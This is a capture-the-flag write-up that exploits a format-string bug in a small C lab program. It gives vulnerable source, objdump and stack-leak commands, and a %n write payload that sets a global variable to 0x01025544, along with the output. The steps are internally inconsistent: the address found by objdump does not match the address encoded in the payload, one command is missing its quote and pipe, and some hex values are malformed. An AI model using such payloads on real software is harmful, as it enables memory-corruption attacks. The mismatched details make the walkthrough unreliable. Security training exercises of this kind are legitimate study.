Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Looking at this code, it is essentially the same as the previous challenge. The difference this time is we have to have the target 
variable equivalent to the hex value 0x01025544, instead of 64. I will be covering three different ways on how to do this, the
first is the one that I originally used to pwn the program.

# Method 1

This version is essentially the same exploit from the last challenge recycled. First we will need to find the address of the target variable.

```
objdump -t ./format3 | grep target
0804964f g    0 .bss    00000004
```

And like that, we have the address of the global target variable which is 0x0804964f. The next piece we need to know for this exploit is how many DWORDS (4 byte segments) between where our fromat string exploit is processed, and where our input is on the stack. To do that, it is the same process that was on the previous excercise.

```
python -c 'print "0000" + ".%x"*15' | ./format3
0000.0.bffffb30.b7fd7ff4.0.0.bffffd38.804849d.bffffb30.200.b7dfd8420.bf7d8420.bffffb74.30303030.2e78252e.252e7825.78252e78
```

From the output, we can see that our input of four zeroes (30303030 in hex) is 12 dwords away. So now that we have the distance, and the address of the target variable we can go ahead and see if this exploit will work.

```
python -c 'print "\xf4\x96\x04\x08%12$n"
target is 00000004 :(
```

So that confirms that our exploit will work, we just have to get the target variable to the right value. After that exploit attempt, the value of the global int variable is interpeted as 0x00000004 which is 4 in hex. This is because we wrote a 4 byte address to the integer. The value we need to set it to is 0x01025544, which is hex for the decimal value 16930116. We can fill the difference by writing that many bytes which will be 16930116 - 4 = 16930112. We can do this by adding %16930112x between the target variable address and the format string (this exploit will take a minute to run).

```
python -c 'print "\xf4\x96\x04\x08%16930112x%12$n"' | ./format3
you have modified the target :)
```
